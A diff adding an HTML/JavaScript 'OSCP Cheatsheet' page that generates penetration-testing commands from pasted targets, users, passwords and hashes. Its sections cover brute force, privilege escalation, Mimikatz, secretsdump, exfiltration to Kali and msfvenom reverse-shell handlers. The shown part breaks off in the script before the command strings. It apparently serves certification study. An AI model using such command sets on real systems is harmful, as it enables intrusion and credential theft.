@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OSCP Cheatsheet</title>
+  <style>
+    :root {
+      --bg: #0f1117;
+      --panel: #171a21;
+      --panel2: #20242e;
+      --text: #e8e8e8;
+      --muted: #a8b0bd;
+      --border: #343a46;
+      --accent: #78dce8;
+      --danger: #ff6b6b;
+      --ok: #7bd88f;
+      --kali: #b8e986;
+      --target: #ffd166;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      padding: 28px 56px 28px 28px;
+      font-family: Arial, Helvetica, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+    }
+
+    h1 {
+      margin-top: 0;
+      margin-bottom: 6px;
+    }
+
+    h2 {
+      margin-top: 24px;
+      margin-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 6px;
+    }
+
+    h3 {
+      margin: 0 0 10px;
+    }
+
+    .muted {
+      color: var(--muted);
+      font-size: 0.95rem;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(280px, 1fr));
+      gap: 16px;
+    }
+
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: var(--muted);
+      font-size: 0.95rem;
+    }
+
+    textarea,
+    input,
+    select {
+      width: 100%;
+      background: var(--panel2);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 9px;
+      font-size: 0.95rem;
+    }
+
+    textarea {
+      min-height: 150px;
+      resize: vertical;
+      font-family: Consolas, Monaco, monospace;
+    }
+
+    input,
+    select {
+      min-height: 38px;
+    }
+
+    pre {
+      margin: 0;
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: #090b10;
+      color: #f3f3f3;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px;
+      font-family: Consolas, Monaco, monospace;
+      font-size: 0.95rem;
+      line-height: 1.45;
+      flex: 1;
+    }
+
+    button {
+      background: var(--panel2);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 8px 12px;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+
+    button:hover {
+      border-color: var(--accent);
+    }
+
+    .row {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(160px, 1fr));
+      gap: 12px;
+    }
+
+    .selected-row {
+      display: grid;
+      grid-template-columns: repeat(6, minmax(140px, 1fr));
+      gap: 12px;
+    }
+
+    .sticky-selected {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(15, 17, 23, 0.96);
+      backdrop-filter: blur(8px);
+      border-bottom: 1px solid var(--border);
+      margin: 22px -56px 18px -28px;
+      padding: 14px 56px 16px 28px;
+    }
+
+    .sticky-selected h2 {
+      margin-top: 0;
+    }
+
+    .command-group {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 16px;
+      scroll-margin-top: 168px;
+    }
+
+    .command-line {
+      display: flex;
+      align-items: stretch;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+
+    .command-line:last-child {
+      margin-bottom: 0;
+    }
+
+    .command-prefix {
+      width: 128px;
+      min-width: 128px;
+      padding-top: 9px;
+      color: var(--muted);
+      font-weight: bold;
+      font-size: 0.92rem;
+    }
+
+    .command-prefix.kali {
+      color: var(--kali);
+    }
+
+    .command-prefix.target {
+      color: var(--target);
+    }
+
+    .copy-status {
+      margin-left: 8px;
+      color: var(--ok);
+      font-size: 0.9rem;
+    }
+
+    .warning {
+      color: var(--danger);
+      font-size: 0.9rem;
+      margin-top: 6px;
+      min-height: 18px;
+    }
+
+    .copy-all {
+      margin-top: 4px;
+    }
+
+    .jump-top {
+      position: fixed;
+      right: 22px;
+      bottom: 22px;
+      z-index: 300;
+      border-color: var(--accent);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.35);
+      opacity: 0.92;
+    }
+
+    .jump-top:hover {
+      opacity: 1;
+    }
+
+    .edge-nav-zone {
+      position: fixed;
+      top: 0;
+      right: 0;
+      width: 30px;
+      height: 100vh;
+      z-index: 250;
+    }
+
+    .edge-nav {
+      position: fixed;
+      top: 86px;
+      right: 0;
+      width: 248px;
+      max-height: calc(100vh - 132px);
+      overflow-y: auto;
+      padding: 12px;
+      background: rgba(23, 26, 33, 0.98);
+      border: 1px solid var(--border);
+      border-right: 0;
+      border-radius: 12px 0 0 12px;
+      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.42);
+      transform: translateX(235px);
+      transition: transform 150ms ease-in-out;
+    }
+
+    .edge-nav-zone:hover .edge-nav,
+    .edge-nav:hover {
+      transform: translateX(0);
+    }
+
+    .edge-nav::before {
+      content: "≡";
+      position: absolute;
+      left: 7px;
+      top: 8px;
+      color: var(--accent);
+      font-size: 1.2rem;
+    }
+
+    .edge-nav h4 {
+      margin: 0 0 10px 24px;
+      color: var(--accent);
+    }
+
+    .edge-nav a {
+      display: block;
+      color: var(--text);
+      text-decoration: none;
+      padding: 6px 8px;
+      border-radius: 6px;
+      font-size: 0.92rem;
+    }
+
+    .edge-nav a:hover {
+      background: var(--panel2);
+      color: var(--accent);
+    }
+
+    @media (max-width: 1200px) {
+      .selected-row {
+        grid-template-columns: repeat(3, minmax(160px, 1fr));
+      }
+    }
+
+    @media (max-width: 850px) {
+      body {
+        padding: 16px 48px 16px 16px;
+      }
+
+      .grid,
+      .row,
+      .selected-row {
+        grid-template-columns: 1fr;
+      }
+
+      .sticky-selected {
+        margin-left: -16px;
+        margin-right: -48px;
+        padding-left: 16px;
+        padding-right: 48px;
+      }
+
+      .command-line {
+        flex-direction: column;
+      }
+
+      .command-prefix {
+        width: auto;
+        min-width: 0;
+        padding-top: 0;
+      }
+
+      .command-line button {
+        width: fit-content;
+      }
+
+      .edge-nav {
+        width: 230px;
+        transform: translateX(217px);
+      }
+    }
+  </style>
+</head>
+
+<body id="top">
+  <h1>OSCP Cheatsheet</h1>
+  <p class="muted">
+    Paste newline-separated values into the boxes, then select active values from the sticky dropdowns.
+    Commands update automatically and can be copied line by line.
+  </p>
+
+  <div class="edge-nav-zone">
+    <nav class="edge-nav" aria-label="Command navigation">
+      <h4>Commands</h4>
+      <a href="#create-folders">Create folders</a>
+      <a href="#nmap">Nmap</a>
+      <a href="#gobuster">gobuster</a>
+      <a href="#hydra">hydra</a>
+      <a href="#nxc-password">NetExec password</a>
+      <a href="#nxc-hash">NetExec hash</a>
+      <a href="#rdp">RDP</a>
+      <a href="#winrm">WinRM</a>
+      <a href="#printspoofer">PrintSpoofer64</a>
+      <a href="#potato">Potato</a>
+      <a href="#ligolo">Ligolo</a>
+      <a href="#password-cracking">Password cracking</a>
+      <a href="#impacket">Impacket</a>
+      <a href="#windows-enum">Windows enumeration</a>
+      <a href="#sharpgpoabuse">SharpGPOAbuse</a>
+      <a href="#wmic">WMIC</a>
+      <a href="#bloodhound">Bloodhound</a>
+      <a href="#mimikatz">Mimikatz</a>
+      <a href="#transfer-to-kali">Transfer files to Kali</a>
+      <a href="#download-from-kali">Downloading files from Kali</a>
+      <a href="#msfvenom">msfvenom</a>
+      <a href="#multi-handler">Multi-Handler</a>
+    </nav>
+  </div>
+
+  <h2>Lists</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>Target Machines</h3>
+      <textarea id="targetsInput" spellcheck="false" placeholder="127.0.0.1&#10;10.0.0.1"></textarea>
+      <div class="warning" id="targetsWarning"></div>
+    </div>
+
+    <div class="card">
+      <h3>Users</h3>
+      <textarea id="usersInput" spellcheck="false" placeholder="administrator&#10;svc_backup"></textarea>
+    </div>
+
+    <div class="card">
+      <h3>Passwords</h3>
+      <textarea id="passwordsInput" spellcheck="false" placeholder="Password123!&#10;Spring2026!"></textarea>
+    </div>
+
+    <div class="card">
+      <h3>Hashes</h3>
+      <textarea id="hashesInput" spellcheck="false" placeholder="BA6E8E7514B5FEE748B3CB11A0337DEE"></textarea>
+    </div>
+  </div>
+
+  <h2>Variables</h2>
+  <div class="row">
+    <div>
+      <label for="domainInput">Domain</label>
+      <input id="domainInput" value="domain.com" spellcheck="false" />
+    </div>
+
+    <div>
+      <label for="kaliIpInput">Kali IP / LHOST / SRC_IP</label>
+      <input id="kaliIpInput" value="192.168.45.219" spellcheck="false" />
+    </div>
+
+    <div>
+      <label for="lportInput">LPORT</label>
+      <input id="lportInput" value="4444" spellcheck="false" />
+    </div>
+  </div>
+
+  <section class="sticky-selected">
+    <h2>Selected Values</h2>
+    <div class="selected-row">
+      <div>
+        <label for="targetSelect">Target</label>
+        <select id="targetSelect"></select>
+      </div>
+
+      <div>
+        <label for="userSelect">User</label>
+        <select id="userSelect"></select>
+      </div>
+
+      <div>
+        <label for="passwordSelect">Password</label>
+        <select id="passwordSelect"></select>
+      </div>
+
+      <div>
+        <label for="hashSelect">Hash</label>
+        <select id="hashSelect"></select>
+      </div>
+
+      <div>
+        <label for="serviceSelect">Service</label>
+        <select id="serviceSelect">
+          <option>SMB</option>
+          <option>LDAP</option>
+          <option>MSSQL</option>
+          <option>WinRM</option>
+          <option>WMI</option>
+          <option>RDP</option>
+          <option>SSH</option>
+          <option>FTP</option>
+        </select>
+      </div>
+
+      <div>
+        <label for="filenameSelect">Filename</label>
+        <select id="filenameSelect">
+          <option>shell.exe</option>
+          <option>ligolo-agent.exe</option>
+          <option>winPEASx64.exe</option>
+          <option>SharpHound.ps1</option>
+          <option>PrintSpoofer64.exe</option>
+          <option>nc.exe</option>
+          <option>mimikatz.exe</option>
+          <option>mimikatz.log</option>
+          <option>SharpEfsPotato.exe</option>
+        </select>
+      </div>
+    </div>
+  </section>
+
+  <h2>Generated Commands</h2>
+
+  <div class="command-group" id="create-folders">
+    <h3>Create folder for each target</h3>
+    <div class="command-line"><button onclick="copyCommand('mkdirCommand', 'mkdirStatus')">Copy</button><pre id="mkdirCommand"></pre></div>
+    <span class="copy-status" id="mkdirStatus"></span>
+  </div>
+
+  <div class="command-group" id="nmap">
+    <h3>Nmap</h3>
+    <div class="command-line"><button onclick="copyCommand('nmapCommand', 'nmapStatus')">Copy</button><pre id="nmapCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix">161 SNMP</span><button onclick="copyCommand('nmapSnmpCommand', 'nmapStatus')">Copy</button><pre id="nmapSnmpCommand"></pre></div>
+    <span class="copy-status" id="nmapStatus"></span>
+  </div>
+
+  <div class="command-group" id="gobuster">
+    <h3>gobuster</h3>
+    <div class="command-line"><button onclick="copyCommand('gobusterCommand', 'gobusterStatus')">Copy</button><pre id="gobusterCommand"></pre></div>
+    <span class="copy-status" id="gobusterStatus"></span>
+  </div>
+
+  <div class="command-group" id="hydra">
+    <h3>Hydra (SSH, RDP, FTP) (-s specify port)</h3>
+    <div class="command-line"><button onclick="copyCommand('hydraCommand1', 'hydraStatus')">Copy</button><pre id="hydraCommand1"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('hydraCommand2', 'hydraStatus')">Copy</button><pre id="hydraCommand2"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('hydraCommand3', 'hydraStatus')">Copy</button><pre id="hydraCommand3"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('hydraCommand4', 'hydraStatus')">Copy</button><pre id="hydraCommand4"></pre></div>
+    <span class="copy-status" id="hydraStatus"></span>
+  </div>
+
+  <div class="command-group" id="nxc-password">
+    <h3>NetExec (nxc) - password (-X for command execution)</h3>
+    <div class="command-line"><button onclick="copyCommand('nxcPasswordCommand1', 'nxcPasswordStatus')">Copy</button><pre id="nxcPasswordCommand1"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('nxcPasswordCommand2', 'nxcPasswordStatus')">Copy</button><pre id="nxcPasswordCommand2"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('nxcPasswordCommand3', 'nxcPasswordStatus')">Copy</button><pre id="nxcPasswordCommand3"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('nxcPasswordCommand4', 'nxcPasswordStatus')">Copy</button><pre id="nxcPasswordCommand4"></pre></div>
+    <span class="copy-status" id="nxcPasswordStatus"></span>
+  </div>
+
+  <div class="command-group" id="nxc-hash">
+    <h3>NetExec (nxc) - hash</h3>
+    <div class="command-line"><button onclick="copyCommand('nxcHashCommand1', 'nxcHashStatus')">Copy</button><pre id="nxcHashCommand1"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('nxcHashCommand2', 'nxcHashStatus')">Copy</button><pre id="nxcHashCommand2"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('nxcHashCommand3', 'nxcHashStatus')">Copy</button><pre id="nxcHashCommand3"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('nxcHashCommand4', 'nxcHashStatus')">Copy</button><pre id="nxcHashCommand4"></pre></div>
+    <span class="copy-status" id="nxcHashStatus"></span>
+  </div>
+
+  <div class="command-group" id="rdp">
+    <h3>RDP</h3>
+    <div class="command-line"><button onclick="copyCommand('rdpCommand', 'rdpStatus')">Copy</button><pre id="rdpCommand"></pre></div>
+    <span class="copy-status" id="rdpStatus"></span>
+  </div>
+
+  <div class="command-group" id="winrm">
+    <h3>WinRM (5985 &amp; 5986)</h3>
+    <div class="command-line"><button onclick="copyCommand('winrmCommand1', 'winrmStatus')">Copy</button><pre id="winrmCommand1"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('winrmCommand2', 'winrmStatus')">Copy</button><pre id="winrmCommand2"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('winrmCommand3', 'winrmStatus')">Copy</button><pre id="winrmCommand3"></pre></div>
+    <span class="copy-status" id="winrmStatus"></span>
+  </div>
+
+  <div class="command-group" id="printspoofer">
+    <h3>PrintSpoofer64 (SeImpersonatePrivilege)</h3>
+    <div class="command-line"><button onclick="copyCommand('printspooferCommand', 'printspooferStatus')">Copy</button><pre id="printspooferCommand"></pre></div>
+    <span class="copy-status" id="printspooferStatus"></span>
+  </div>
+
+  <div class="command-group" id="potato">
+    <h3>Potato (SeImpersonatePrivilege)</h3>
+    <div class="command-line"><button onclick="copyCommand('potatoCommand', 'potatoStatus')">Copy</button><pre id="potatoCommand"></pre></div>
+    <span class="copy-status" id="potatoStatus"></span>
+  </div>
+
+  <div class="command-group" id="ligolo">
+    <h3>Ligolo</h3>
+    <div class="command-line"><span class="command-prefix kali">On Kali</span><button onclick="copyCommand('ligoloTunCommand', 'ligoloStatus')">Copy</button><pre id="ligoloTunCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix kali"></span><button onclick="copyCommand('ligoloLinkCommand', 'ligoloStatus')">Copy</button><pre id="ligoloLinkCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix kali"></span><button onclick="copyCommand('ligoloProxyCommand', 'ligoloStatus')">Copy</button><pre id="ligoloProxyCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix target">On target</span><button onclick="copyCommand('ligoloAgentCommand', 'ligoloStatus')">Copy</button><pre id="ligoloAgentCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix kali">On Kali</span><button onclick="copyCommand('ligoloSessionCommand', 'ligoloStatus')">Copy</button><pre id="ligoloSessionCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix kali"></span><button onclick="copyCommand('ligoloIfconfigCommand', 'ligoloStatus')">Copy</button><pre id="ligoloIfconfigCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix kali"></span><button onclick="copyCommand('ligoloRouteCommand', 'ligoloStatus')">Copy</button><pre id="ligoloRouteCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix kali"></span><button onclick="copyCommand('ligoloStartCommand', 'ligoloStatus')">Copy</button><pre id="ligoloStartCommand"></pre></div>
+    <span class="copy-status" id="ligoloStatus"></span>
+  </div>
+
+
+  <div class="command-group" id="password-cracking">
+    <h3>Password cracking</h3>
+    <div class="command-line"><span class="command-prefix">john</span><button onclick="copyCommand('johnCrackCommand', 'passwordCrackingStatus')">Copy</button><pre id="johnCrackCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('johnShowCommand', 'passwordCrackingStatus')">Copy</button><pre id="johnShowCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix">hashcat</span><button onclick="copyCommand('hashcatCrackCommand', 'passwordCrackingStatus')">Copy</button><pre id="hashcatCrackCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('hashcatShowCommand', 'passwordCrackingStatus')">Copy</button><pre id="hashcatShowCommand"></pre></div>
+    <span class="copy-status" id="passwordCrackingStatus"></span>
+  </div>
+
+  <div class="command-group" id="impacket">
+    <h3>Impacket</h3>
+    <div class="command-line"><span class="command-prefix">Local admin &amp; ADMIN$</span><button onclick="copyCommand('impacketPsexecCommand', 'impacketStatus')">Copy</button><pre id="impacketPsexecCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('impacketWmiexecCommand', 'impacketStatus')">Copy</button><pre id="impacketWmiexecCommand"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('impacketSecretsdumpPasswordCommand', 'impacketStatus')">Copy</button><pre id="impacketSecretsdumpPasswordCommand"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('impacketSecretsdumpHashCommand', 'impacketStatus')">Copy</button><pre id="impacketSecretsdumpHashCommand"></pre></div>
+    <span class="copy-status" id="impacketStatus"></span>
+  </div>
+
+  <div class="command-group" id="windows-enum">
+    <h3>Windows enumeration</h3>
+    <div class="command-line"><button onclick="copyCommand('windowsEnumNetUserDomainCommand', 'windowsEnumStatus')">Copy</button><pre id="windowsEnumNetUserDomainCommand"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('windowsEnumNetUserCommand', 'windowsEnumStatus')">Copy</button><pre id="windowsEnumNetUserCommand"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('windowsEnumWhoamiCommand', 'windowsEnumStatus')">Copy</button><pre id="windowsEnumWhoamiCommand"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('windowsEnumSysteminfoCommand', 'windowsEnumStatus')">Copy</button><pre id="windowsEnumSysteminfoCommand"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('windowsEnumLocalAdminsCommand', 'windowsEnumStatus')">Copy</button><pre id="windowsEnumLocalAdminsCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix">Password policy</span><button onclick="copyCommand('windowsEnumPasswordPolicyCommand', 'windowsEnumStatus')">Copy</button><pre id="windowsEnumPasswordPolicyCommand"></pre></div>
+    <span class="copy-status" id="windowsEnumStatus"></span>
+  </div>
+
+  <div class="command-group" id="sharpgpoabuse">
+    <h3>SharpGPOAbuse</h3>
+    <div class="command-line"><button onclick="copyCommand('sharpGpoAbuseCommand', 'sharpGpoStatus')">Copy</button><pre id="sharpGpoAbuseCommand"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('gpupdateCommand', 'sharpGpoStatus')">Copy</button><pre id="gpupdateCommand"></pre></div>
+    <span class="copy-status" id="sharpGpoStatus"></span>
+  </div>
+
+  <div class="command-group" id="wmic">
+    <h3>WMIC (port 135 and local admin on target)</h3>
+    <div class="command-line"><span class="command-prefix target">Windows</span><button onclick="copyCommand('wmicCommand', 'wmicStatus')">Copy</button><pre id="wmicCommand"></pre></div>
+    <span class="copy-status" id="wmicStatus"></span>
+  </div>
+
+  <div class="command-group" id="bloodhound">
+    <h3>Bloodhound (/etc/bhapi/bhapi.json)</h3>
+    <div class="command-line"><span class="command-prefix kali">On Kali</span><button onclick="copyCommand('bloodhoundPythonCommand', 'bloodhoundStatus')">Copy</button><pre id="bloodhoundPythonCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix kali"></span><button onclick="copyCommand('bloodhoundCePythonCommand', 'bloodhoundStatus')">Copy</button><pre id="bloodhoundCePythonCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix target">On target</span><button onclick="copyCommand('bloodhoundPsBypassCommand', 'bloodhoundStatus')">Copy</button><pre id="bloodhoundPsBypassCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix target"></span><button onclick="copyCommand('bloodhoundImportCommand', 'bloodhoundStatus')">Copy</button><pre id="bloodhoundImportCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix target"></span><button onclick="copyCommand('bloodhoundDotSourceCommand', 'bloodhoundStatus')">Copy</button><pre id="bloodhoundDotSourceCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix target"></span><button onclick="copyCommand('bloodhoundInvokeCommand', 'bloodhoundStatus')">Copy</button><pre id="bloodhoundInvokeCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix">Pre-built queries</span><button onclick="copyCommand('bhQueryDomainAdmins', 'bloodhoundStatus')">Copy</button><pre id="bhQueryDomainAdmins"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('bhQueryShortestDomainAdmins', 'bloodhoundStatus')">Copy</button><pre id="bhQueryShortestDomainAdmins"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('bhQueryShortestOwned', 'bloodhoundStatus')">Copy</button><pre id="bhQueryShortestOwned"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('bhQueryDomainUsersRdp', 'bloodhoundStatus')">Copy</button><pre id="bhQueryDomainUsersRdp"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('bhQueryDomainUsersLocalAdmins', 'bloodhoundStatus')">Copy</button><pre id="bhQueryDomainUsersLocalAdmins"></pre></div>
+    <div class="command-line"><span class="command-prefix"></span><button onclick="copyCommand('bhQueryKerberoastable', 'bloodhoundStatus')">Copy</button><pre id="bhQueryKerberoastable"></pre></div>
+    <span class="copy-status" id="bloodhoundStatus"></span>
+  </div>
+
+
+  <div class="command-group" id="mimikatz">
+    <h3>Mimikatz</h3>
+    <div class="command-line"><button onclick="copyCommand('mimikatzCommand', 'mimikatzStatus')">Copy</button><pre id="mimikatzCommand"></pre></div>
+    <span class="copy-status" id="mimikatzStatus"></span>
+  </div>
+
+  <div class="command-group" id="transfer-to-kali">
+    <h3>Transfer files to Kali</h3>
+    <div class="command-line"><span class="command-prefix kali">On Kali</span><button onclick="copyCommand('kaliNcListenerCommand', 'transferStatus')">Copy</button><pre id="kaliNcListenerCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix target">On target</span><button onclick="copyCommand('targetNcUploadCommand', 'transferStatus')">Copy</button><pre id="targetNcUploadCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix target"></span><button onclick="copyCommand('targetHttpServerCommand', 'transferStatus')">Copy</button><pre id="targetHttpServerCommand"></pre></div>
+    <span class="copy-status" id="transferStatus"></span>
+  </div>
+
+  <div class="command-group" id="download-from-kali">
+    <h3>Downloading files from Kali</h3>
+    <div class="command-line"><span class="command-prefix">Linux</span><button onclick="copyCommand('wgetCommand', 'downloadStatus')">Copy</button><pre id="wgetCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix">Linux/PowerShell</span><button onclick="copyCommand('curlCommand', 'downloadStatus')">Copy</button><pre id="curlCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix">PowerShell</span><button onclick="copyCommand('iwrCommand', 'downloadStatus')">Copy</button><pre id="iwrCommand"></pre></div>
+    <div class="command-line"><span class="command-prefix">CMD</span><button onclick="copyCommand('certutilCommand', 'downloadStatus')">Copy</button><pre id="certutilCommand"></pre></div>
+    <span class="copy-status" id="downloadStatus"></span>
+  </div>
+
+  <div class="command-group" id="msfvenom">
+    <h3>msfvenom</h3>
+    <div class="command-line"><button onclick="copyCommand('msfvenomCommand', 'msfvenomStatus')">Copy</button><pre id="msfvenomCommand"></pre></div>
+    <span class="copy-status" id="msfvenomStatus"></span>
+  </div>
+
+  <div class="command-group" id="multi-handler">
+    <h3>Multi-Handler</h3>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand1', 'handlerStatus')">Copy</button><pre id="handlerCommand1"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand2', 'handlerStatus')">Copy</button><pre id="handlerCommand2"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand3', 'handlerStatus')">Copy</button><pre id="handlerCommand3"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand4', 'handlerStatus')">Copy</button><pre id="handlerCommand4"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand5', 'handlerStatus')">Copy</button><pre id="handlerCommand5"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand6', 'handlerStatus')">Copy</button><pre id="handlerCommand6"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand7', 'handlerStatus')">Copy</button><pre id="handlerCommand7"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand8', 'handlerStatus')">Copy</button><pre id="handlerCommand8"></pre></div>
+    <div class="command-line"><button onclick="copyCommand('handlerCommand9', 'handlerStatus')">Copy</button><pre id="handlerCommand9"></pre></div>
+    <span class="copy-status" id="handlerStatus"></span>
+  </div>
+
+  <button class="copy-all" onclick="copyAllCommands()">Copy All Commands</button>
+  <span class="copy-status" id="allStatus"></span>
+
+  <button class="jump-top" onclick="jumpToTop()">Top ↑</button>
+
+  <script>
+    const stateKeys = [
+      "targetsInput",
+      "usersInput",
+      "passwordsInput",
+      "hashesInput",
+      "domainInput",
+      "kaliIpInput",
+      "lportInput",
+      "serviceSelect",
+      "filenameSelect"
+    ];
+
+    const commandIds = [
+      "mkdirCommand", "nmapCommand", "nmapSnmpCommand", "gobusterCommand",
+      "hydraCommand1", "hydraCommand2", "hydraCommand3", "hydraCommand4",
+      "nxcPasswordCommand1", "nxcPasswordCommand2", "nxcPasswordCommand3", "nxcPasswordCommand4",
+      "nxcHashCommand1", "nxcHashCommand2", "nxcHashCommand3", "nxcHashCommand4",
+      "rdpCommand", "winrmCommand1", "winrmCommand2", "winrmCommand3", "printspooferCommand", "potatoCommand",
+      "ligoloTunCommand", "ligoloLinkCommand", "ligoloProxyCommand", "ligoloAgentCommand", "ligoloSessionCommand",
+      "ligoloIfconfigCommand", "ligoloRouteCommand", "ligoloStartCommand",
+      "johnCrackCommand", "johnShowCommand", "hashcatCrackCommand", "hashcatShowCommand",
+      "impacketPsexecCommand", "impacketWmiexecCommand", "impacketSecretsdumpPasswordCommand", "impacketSecretsdumpHashCommand",
+      "windowsEnumNetUserDomainCommand", "windowsEnumNetUserCommand", "windowsEnumWhoamiCommand",
+      "windowsEnumSysteminfoCommand", "windowsEnumLocalAdminsCommand", "windowsEnumPasswordPolicyCommand",
+      "sharpGpoAbuseCommand", "gpupdateCommand", "wmicCommand",
+      "bloodhoundPythonCommand", "bloodhoundCePythonCommand", "bloodhoundPsBypassCommand",
+      "bloodhoundImportCommand", "bloodhoundDotSourceCommand", "bloodhoundInvokeCommand",
+      "bhQueryDomainAdmins", "bhQueryShortestDomainAdmins", "bhQueryShortestOwned", "bhQueryDomainUsersRdp",
+      "bhQueryDomainUsersLocalAdmins", "bhQueryKerberoastable",
+      "mimikatzCommand", "kaliNcListenerCommand", "targetNcUploadCommand", "targetHttpServerCommand",
+      "wgetCommand", "curlCommand", "iwrCommand", "certutilCommand",
+      "msfvenomCommand", "handlerCommand1", "handlerCommand2", "handlerCommand3",
+      "handlerCommand4", "handlerCommand5", "handlerCommand6", "handlerCommand7",
+      "handlerCommand8", "handlerCommand9"
+    ];
+
+    function parseLines(text) {
+      return text
+        .split(/\r?\n/)
+        .map(line => line.trim())
+        .filter(Boolean);
+    }
+
+    function unique(values) {
+      return [...new Set(values)];
+    }
+
+    function lastOctet(ip) {
+      const parts = ip.trim().split(".");
+      return parts.length === 4 ? parts[3] : ip.trim();
+    }
+
+    function cidr24Network(ip) {
+      const parts = ip.trim().split(".");
+      return parts.length === 4 ? `${parts[0]}.${parts[1]}.${parts[2]}.0/24` : `${ip}/24`;
+    }
+
+    function protocolValue() {
+      return document.getElementById("serviceSelect").value.toLowerCase();
+    }
+
+    function selectedOrFallback(id, fallback) {
+      const value = document.getElementById(id).value.trim();
+      return value || fallback;
+    }
+
+    function populateSelect(selectId, values, placeholder) {
+      const select = document.getElementById(selectId);
+      const previous = select.value;
+
+      select.innerHTML = "";
+
+      if (values.length === 0) {
+        const option = document.createElement("option");
+        option.value = "";
+        option.textContent = placeholder;
+        select.appendChild(option);
+        return;
+      }
+
+      values.forEach(value => {
+        const option = document.createElement("option");
+        option.value = value;
+        option.textContent = value;
+        select.appendChild(option);
+      });
+
+      if (values.includes(previous)) {
+        select.value = previous;
+      }
+    }
+
+    function updateDropdowns() {
+      const targets = unique(parseLines(document.getElementById("targetsInput").value));
+      const users = unique(parseLines(document.getElementById("usersInput").value));
+      const passwords = unique(parseLines(document.getElementById("passwordsInput").value));
+      const hashes = unique(parseLines(document.getElementById("hashesInput").value));
+
+      populateSelect("targetSelect", targets, "No targets pasted");
+      populateSelect("userSelect", users, "No users pasted");
+      populateSelect("passwordSelect", passwords, "No passwords pasted");
+      populateSelect("hashSelect", hashes, "No hashes pasted");
+
+      const invalidTargets = targets.filter(target => target.split(".").length !== 4);
+      document.getElementById("targetsWarning").textContent =
+        invalidTargets.length > 0
+          ? "Warning: Some targets do not look like IPv4 addresses: " + invalidTargets.join(", ")
+          : "";
+    }
+
+    function updateCommands() {
+      updateDropdowns();
+
+      const targets = unique(parseLines(document.getElementById("targetsInput").value));
+      const target = selectedOrFallback("targetSelect", "<target_ip>");
+      const last = target !== "<target_ip>" ? lastOctet(target) : "<last_octet>";
